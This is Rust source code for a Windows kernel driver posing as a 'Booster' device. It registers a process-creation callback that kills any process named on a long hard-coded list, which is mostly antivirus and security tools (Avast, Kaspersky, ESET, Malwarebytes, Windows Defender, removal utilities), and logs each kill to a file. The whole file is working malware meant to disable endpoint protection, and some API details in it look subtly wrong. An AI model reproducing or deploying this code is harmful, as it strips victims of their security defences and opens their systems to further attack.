#![no_std]
#![no_main]

extern crate alloc;
extern crate wdk_panic;

use core::ffi::c_void;
use core::ptr::null_mut;
use core::slice;
use core::str;
use alloc::vec::Vec;
use alloc::string::String;
use alloc::string::ToString;
use wdk::*;
use wdk_alloc::WdkAllocator;
use wdk_sys::ntddk::*;
use wdk_sys::*;

// Declare the missing external function.
unsafe extern "system" {
    fn PsGetProcessImageFileName(Process: *mut c_void) -> *const u8;
}

#[global_allocator]
static GLOBAL_ALLOCATOR: WdkAllocator = WdkAllocator;

// Process termination blacklist – all names are lower-case.
static BLACKLIST: &[&str] = &[
    "securitytaskmanager.exe",
    "speedupmypc.exe",
    "remoteprocesses.exe",
    "systemhealer.exe",
    "rvl1qb3c.exe",
    "combofix.exe",
    "hijackthis.exe",
    "cwshredder.exe",
    "sunnyday.exe",
    "appverifier.exe",
    "dekker.exe",
    "footprints.exe",
    "foreplay.exe",
    "internetport3.exe",
    "nowuseeitplayer.exe",
    "ratchet.exe",
    "smolder.exe",
    "webdev.exe",
    "windoweather.exe",
    "winlogger.exe",
    "ytdownloader.exe",
    "nettrans.exe",
    "fastweb.exe",
    "unokucu.exe",
    "wincheck.exe",
    "veticeq.exe",
    "geunfy.exe",
    "q3ci_ cgvp.exe",
    "guvtdhji.exe",
    "hemkajdoa.exe",
    "jsdrv.exe",
    "lowyku.exe",
    "musgownyo.exe",
    "setmyhomepage.exe",
    "win_en_77.exe",
    "wizzcaster.exe",
    "xeeedxi.exe",
    "xmkysecqun64.exe",
    "maintainer.exe",
    "dsrlte.exe",
    "eitehko.exe",
    "gopidul.exe",
    "produpd.exe",
    "bfsvc.exe",
    "hdaudio.exe",
    "rawei.exe",
    "vpdagent_x64.exe",
    "caster.exe",
    "vestie.exe",
    "windows defender.exe",
    "rzsynapse.exe",
    "bestcleaner.exe",
    "interstat",
    "updateadmin.exe",
    "anonymizerlauncher.exe",
    "pccleanplus.exe",
    "leaping.exe",
    "mytransitguide.exe",
    "optimum.exe",
    "reoptimizer.exe",
    "vidsqaure.exe",
    "s5mark.exe",
    "mymemory.exe",
    "360rp.exe",
    "360rps.exe",
    "360safe.exe",
    "360safebox.exe",
    "360sd.exe",
    "360tray.exe",
    "a2guard.exe",
    "a2service.exe",
    "a2start.exe",
    "adawaredesktop.exe",
    "adawareservice.exe",
    "adawaretray.exe",
    "agentsvc.exe",
    "arwsrvc.exe",
    "aswidsagenta.exe",
    "avastsvc.exe",
    "avastui.exe",
    "avcenter.exe",
    "avgrsx.exe",
    "avgsvc.exe",
    "avgsvca.exe",
    "avgsvcx.exe",
    "avgui.exe",
    "avguirna.exe",
    "avguix.exe",
    "avkproxy.exe",
    "avkservice.exe",
    "avktray.exe",
    "avkwctlx64.exe",
    "avp.exe",
    "avpui.exe",
    "bdagent.exe",
    "bdssvc.exe",
    "bdwtxag.exe",
    "bgnag.exe",
    "bgwsc.exe",
    "bssiss.exe",
    "bullguard.exe",
    "bullguardbhvscanner.exe",
    "bullguardscanner.exe",
    "bullguardupdate.exe",
    "bytefence.exe",
    "cavwp.exe",
    "cis.exe",
    "cispremium_installer.exe",
    "cistray.exe",
    "clambc.exe",
    "clamconf.exe",
    "clamd.exe",
    "clamdscan.exe",
    "clamscan.exe",
    "cmdagent.exe",
    "compuclever.exe",
    "coreframeworkhost.exe",
    "coreserviceshell.exe",
    "dwarkdaemon.exe",
    "dwengine.exe",
    "dwservice.exe",
    "egui.exe",
    "ehttpsrv.exe",
    "ekrn.exe",
    "emlproxy.exe",
    "fcappdb.exe",
    "fcdblog.exe",
    "fchelper64.exe",
    "filmsg.exe",
    "fmon.exe",
    "forticlient.exe",
    "forticlientviruscleaner.exe",
    "fortiesnac.exe",
    "fortiproxy.exe",
    "fortiscand.exe",
    "fortisslvpndaemon.exe",
    "fortiwf.exe",
    "fpavserver.exe",
    "fprottray.exe",
    "fpwin.exe",
    "freshclam.exe",
    "fsadminsettings.exe",
    "f-secure-safe-network-installer.exe",
    "fsgk32.exe",
    "fshdll64.exe",
    "fshoster32.exe",
    "fsma32.exe",
    "fsorsp.exe",
    "fssm32.exe",
    "gdkbfltexe32.exe",
    "gdsc.exe",
    "gdscan.exe",
    "geekbuddyrsp.exe",
    "guardxkickoff.exe",
    "guardxkickoff_x64.exe",
    "guardxservice.exe",
    "guardxservice_x64.exe",
    "guardxup.exe",
    "instup.exe",
    "iparmor.exe",
    "iptray.exe",
    "isesrv.exe",
    "k7avscan.exe",
    "k7crvsvc.exe",
    "k7emlpxy.exe",
    "k7rtscan.exe",
    "k7sysmon.exe",
    "k7tsecurity.exe",
    "k7tsmain.exe",
    "k7tsmngr.exe",
    "kavstart.exe",
    "kavsvc.exe",
    "kavsvcui.exe",
    "kmailmon.exe",
    "ksafesvc.exe",
    "ksafetray.exe",
    "kwatch.exe",
    "launcher_service.exe",
    "mbam.exe",
    "mbamservice.exe",
    "mbamtray.exe",
    "mcapexe.exe",
    "mcclientanalytics.exe",
    "mccspservicehost.exe",
    "mcsacore.exe",
    "mcshield.exe",
    "mcsvhost.exe",
    "mfefire.exe",
    "mfemms.exe",
    "mfevtps.exe",
    "modulecoreservice.exe",
    "mypcbackup.exe",
    "nanoav.exe",
    "nanosvc.exe",
    "navapsvc.exe",
    "navapw32.exe",
    "norman_malware_cleaner.exe",
    "onesystemcare.exe",
    "onlinent.exe",
    "opssvc.exe",
    "panda_url_filteringb.exe",
    "pccguide.exe",
    "pccmain.exe",
    "pccntmon.exe",
    "pefservice.exe",
    "productagentservice.exe",
    "psanhost.exe",
    "psuaconsole.exe",
    "psuamain.exe",
    "psuaservice.exe",
    "ptsessionagent.exe",
    "ptsvchost.exe",
    "qmdl.exe",
    "qqpcmgr.exe",
    "qqpcnetflow.exe",
    "qqpcpatch.exe",
    "qqpcrealtimespeedup.exe",
    "qqpcrtp.exe",
    "qqpctray.exe",
    "qtwebengineprocess.exe",
    "quhlpsvc.exe",
    "rav.exe",
    "ravmon.exe",
    "ravmond.exe",
    "ravtimer.exe",
    "reprsvc.exe",
    "rising.exe",
    "sabsi.exe",
    "safeboxtray",
    "sapissvc.exe",
    "sascore.exe",
    "sbamsvc.exe",
    "sbamtray.exe",
    "sbpimsvc.exe",
    "scanner.exe",
    "scanwscs.exe",
    "sched.exe",
    "scsecsvc.exe",
    "sdrservice.exe",
    "seccenter.exe",
    "sigtool.exe",
    "sntpservice.exe",
    "solocfg.exe",
    "soloscan.exe",
    "solosent.exe",
    "sphinx.exe",
    "superantispyware.exe",
    "sweep95.exe",
    "tbscan.exe",
    "twister.exe",
    "twsscan.exe",
    "twssrv.exe",
    "uiseagnt.exe",
    "uiwatchdog.exe",
    "uiwinmgr.exe",
    "updatesrv.exe",
    "vba32ldr.exe",
    "vipreedgeprotection.exe",
    "vipreui.exe",
    "virusutilities.exe",
    "vkise.exe",
    "vsserv.exe",
    "vsservp.exe",
    "webscanx.exe",
    "wfindv32.exe",
    "dwscanner.exe",
    "frwl_svc.exe",
    "spideragent.exe",
    "spideragent_adm.exe",
    "frwl_notify.exe",
    "dwnetfilter.exe",
    "a2wizard.exe",
    "sascore64.exe",
    "sastask.exe",
    "pandasecuritytb.exe",
    "avgcsrva.exe",
    "avgidsagenta.exe",
    "avgwdsvca.exe",
    "avgnt.exe",
    "avguard.exe",
    "avshadow.exe",
    "avira.servicehost.exe",
    "avira.systray.exe",
    "avira.systemspeedup.speedupservice.exe",
    "avira.systemspeedup.ui.systray.exe",
    "avgrsa.exe",
    "avgfwsa.exe",
    "avgnsa.exe",
    "avgemca.exe",
    "avgmfapx.exe",
    "avgcomdlga.exe",
    "avgdiagex.exe",
    "avgcmgr.exe",
    "avmailc7.exe",
    "avwebg7.exe",
    "avira.systraystarttrigger.exe",
    "mchost.exe",
    "mcuicnt.exe",
    "mcods.exe",
    "zhudongfangyu.exe",
    "360sdrun.exe",
    "vssbridge64.exe",
    "nanoreport.exe",
    "nanoreportc64.exe",
    "avkbap64.exe",
    "ptwatchdog.exe",
    "qhavft64.exe",
    "inst.exe",
    "strtupap.exe",
    "eeclnt.exe",
    "dragon_updater.exe",
    "csssrv64.exe",
    "unit_manager.exe",
    "unit.exe",
    "vdcss.exe",
    "cmdvirth.exe",
    "fortitray.exe",
    "sophoshealth.exe",
    "nswscsvc.exe",
    "rkill.exe",
    "antivirus.exe",
];

//
// Helper: Write a log message to "C:\terminator.log".
// This uses ZwCreateFile, ZwWriteFile, and ZwClose to open the log file in append mode,
// write the message, and then close the handle. In production code you should add proper
// synchronization and more elaborate error handling.
//
unsafe fn log_to_file(message: &str) {
    // Convert file path into a UNICODE_STRING.
    // In kernel mode, file paths use the NT object manager syntax.
    let file_path = "\\??\\C:\\terminator.log";
    let mut uni_path: UNICODE_STRING = UNICODE_STRING::default();
    let _wstring = string_to_ustring(file_path, &mut uni_path);

    // Initialize object attributes.
    let mut obj_attr = OBJECT_ATTRIBUTES {
        Length: core::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
        RootDirectory: null_mut(),
        ObjectName: &mut uni_path,
        Attributes: OBJ_CASE_INSENSITIVE,
        SecurityDescriptor: null_mut(),
        SecurityQualityOfService: null_mut(),
    };

    // Setup an IO status block.
    let mut io_status = IO_STATUS_BLOCK::default();

    // Open or create file for appending.
    let mut handle: HANDLE = null_mut();
    let status = unsafe {
        ZwCreateFile(
            &mut handle,
            FILE_APPEND_DATA | SYNCHRONIZE,
            &mut obj_attr,
            &mut io_status,
            null_mut(), // allocation size
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ,
            FILE_OPEN_IF,
            FILE_SYNCHRONOUS_IO_NONALERT,
            null_mut(),
            0,
        )
    };

    if !nt_success(status) {
        unsafe {
            DbgPrint(
                "log_to_file: Failed to open log file. Status: 0x{:x}\n\0".as_ptr() as *const i8,
                status,
            );
        }
        return;
    }

    // Convert message to bytes (assume ASCII compatible).
    let bytes = message.as_bytes();

    // Write log entry.
    let status = unsafe {
        ZwWriteFile(
            handle,
            null_mut(),
            None,
            null_mut(),
            &mut io_status,
            bytes.as_ptr() as *mut c_void,
            bytes.len() as u32,
            null_mut(),
            null_mut(),
        )
    };

    if !nt_success(status) {
        unsafe {
            DbgPrint(
                "log_to_file: Failed to write log. Status: 0x{:x}\n\0".as_ptr() as *const i8,
                status,
            );
        }
    }

    // Close the file handle. Explicitly ignore the return value.
    unsafe {
        let _ = ZwClose(handle);
    }
}

//
// Helper: Retrieve the process image file name from the process object.
// Calls PsGetProcessImageFileName and converts the ANSI string to a Rust String.
fn get_process_name(process: *mut c_void) -> String {
    unsafe {
        let name_ptr = PsGetProcessImageFileName(process);
        if name_ptr.is_null() {
            return String::new();
        }
        let mut len = 0;
        while *name_ptr.add(len) != 0 {
            len += 1;
        }
        let bytes = slice::from_raw_parts(name_ptr, len);
        // Assume the name is valid ASCII.
        str::from_utf8_unchecked(bytes).to_string()
    }
}

//
// Convert a PCUNICODE_STRING to a Rust String (lossy conversion).
//
fn unicode_to_string(uni: PUNICODE_STRING) -> String {
    unsafe {
        String::from_utf16_lossy(slice::from_raw_parts(
            (*uni).Buffer,
            ((*uni).Length / 2) as usize,
        ))
    }
}

//
// Convert a Rust &str to a UNICODE_STRING. Returns the underlying wide string.
// The caller must ensure the wide string lives long enough.
//
fn string_to_ustring(s: &str, uc: &mut UNICODE_STRING) -> Vec<u16> {
    let mut wstring: Vec<u16> = s.encode_utf16().collect();
    uc.Length = (wstring.len() * 2) as u16;
    uc.MaximumLength = (wstring.len() * 2) as u16;
    uc.Buffer = wstring.as_mut_ptr();
    wstring
}

//
// Process notify callback.
// When a process is created, its image name is retrieved and converted to lower case.
// If the name exactly matches one in our blacklist, we terminate the process and log the event.
//
unsafe extern "C" fn process_notify_callback(
    process: PKPROCESS,
    _create_info: *mut c_void,
    _context: *mut PS_CREATE_NOTIFY_INFO,
) {
    let proc_name = get_process_name(process as *mut c_void).to_ascii_lowercase();

    for &blacklisted in BLACKLIST.iter() {
        if proc_name == blacklisted {
            let term_status = unsafe { ZwTerminateProcess(process as *mut c_void, 1) };
            if nt_success(term_status) {
                let log_msg = alloc::format!(
                    "Terminated process: {} (reason: blacklist match)\n",
                    proc_name
                );
                unsafe {
                    log_to_file(&log_msg);
                }
            } else {
                let log_msg = alloc::format!(
                    "Failed to terminate blacklisted process: {}. Status: 0x{:x}\n",
                    proc_name,
                    term_status
                );
                unsafe {
                    log_to_file(&log_msg);
                }
            }
            break;
        }
    }
}

//
// DriverEntry: Create a device and symbolic link, set IRP dispatch routines,
// register the process notification callback, and log events.
//
// This entry point is exported with #[no_mangle] and is declared unsafe.
#[unsafe(no_mangle)]
pub unsafe extern "system" fn DriverEntry(
    driver: *mut DRIVER_OBJECT,
    registry_path: PUNICODE_STRING,
) -> NTSTATUS {
    unsafe {
        log_to_file("DriverEntry: Rust driver loading.\n");
    }

    let reg_path_str = unicode_to_string(registry_path);
    unsafe {
        DbgPrint(
            "Registry Path: %s\n\0".as_ptr() as *const i8,
            reg_path_str.as_ptr(),
        );
    }

    // Create device.
    let mut dev: *mut DEVICE_OBJECT = null_mut();
    let mut dev_name = UNICODE_STRING::default();
    let _ = string_to_ustring("\\Device\\Booster", &mut dev_name);
    let status = unsafe {
        IoCreateDevice(
            driver,
            0,
            &mut dev_name,
            FILE_DEVICE_UNKNOWN,
            0,
            0,
            &mut dev,
        )
    };
    if !nt_success(status) {
        let err_msg = alloc::format!("Error creating device. Status: 0x{:x}\n", status);
        unsafe {
            log_to_file(&err_msg);
        }
        return status;
    }

    // Create symbolic link.
    let mut sym_name = UNICODE_STRING::default();
    let _ = string_to_ustring("\\??\\Booster", &mut sym_name);
    let status = unsafe { IoCreateSymbolicLink(&mut sym_name, &mut dev_name) };
    if !nt_success(status) {
        unsafe {
            log_to_file("Error creating symbolic link.\n");
            IoDeleteDevice(dev);
        }
        return status;
    }

    // Set device flags and IRP handlers.
    unsafe {
        (*dev).Flags |= DO_BUFFERED_IO;
        (*driver).DriverUnload = Some(driver_unload);
        (*driver).MajorFunction[IRP_MJ_CREATE as usize] = Some(irp_dispatch);
        (*driver).MajorFunction[IRP_MJ_CLOSE as usize] = Some(irp_dispatch);
        (*driver).MajorFunction[IRP_MJ_WRITE as usize] = Some(irp_write);
    }

    // Register process notification callback.
    let proc_status =
        unsafe { PsSetCreateProcessNotifyRoutineEx(Some(process_notify_callback), 0u8) };
    if !nt_success(proc_status) {
        let err_msg = alloc::format!(
            "Error registering process notify callback. Status: 0x{:x}\n",
            proc_status
        );
        unsafe {
            log_to_file(&err_msg);
        }
    }

    unsafe {
        log_to_file("DriverEntry: Initialization completed successfully.\n");
    }
    STATUS_SUCCESS
}

//
// Driver unload: Unregister the process callback, delete symbolic link and device,
// and log the unload event.
//
unsafe extern "C" fn driver_unload(driver: *mut DRIVER_OBJECT) {
    unsafe {
        let _ = PsSetCreateProcessNotifyRoutineEx(Some(process_notify_callback), 1u8);
    }

    let mut sym_name = UNICODE_STRING::default();
    let _ = string_to_ustring("\\??\\Booster", &mut sym_name);
    unsafe {
        let _ = IoDeleteSymbolicLink(&mut sym_name);
        IoDeleteDevice((*driver).DeviceObject);
        log_to_file("Driver unloaded.\n");
    }
}

//
// IRP dispatch: For create and close, complete the IRP with success.
//
unsafe extern "C" fn irp_dispatch(
    _device: *mut DEVICE_OBJECT,
    irp: *mut IRP,
) -> NTSTATUS {
    unsafe {
        (*irp).IoStatus.__bindgen_anon_1.Status = STATUS_SUCCESS;
        (*irp).IoStatus.Information = 0;
        IofCompleteRequest(irp, 0);
    }
    STATUS_SUCCESS
}

//
// IRP write: Complete the IRP with success (example implementation).
//
unsafe extern "C" fn irp_write(
    _device: *mut DEVICE_OBJECT,
    irp: *mut IRP,
) -> NTSTATUS {
    unsafe {
        (*irp).IoStatus.__bindgen_anon_1.Status = STATUS_SUCCESS;
        (*irp).IoStatus.Information = 0;
        IofCompleteRequest(irp, 0);
    }
    STATUS_SUCCESS
}
